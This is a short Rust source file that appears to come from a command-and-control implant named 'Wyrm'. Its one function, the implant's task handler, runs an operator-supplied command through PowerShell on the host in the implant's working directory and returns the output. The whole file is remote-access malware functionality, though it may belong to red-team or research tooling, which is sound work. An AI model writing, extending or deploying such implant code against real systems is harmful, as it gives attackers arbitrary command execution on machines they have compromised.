use std::process::Command;

use serde::Serialize;
use shared::tasks::PowershellOutput;

use crate::wyrm::Wyrm;

pub fn run_powershell(command: &Option<String>, implant: &Wyrm) -> Option<impl Serialize + use<>> {
    let command = command.as_ref()?;

    let output = Command::new("powershell")
        .arg(command)
        .current_dir(&implant.current_working_directory)
        .output()
        .ok()?;

    let stdout = String::from_utf8(output.stdout).ok();
    let stderr = String::from_utf8(output.stderr).ok();

    Some(PowershellOutput { stdout, stderr })
}
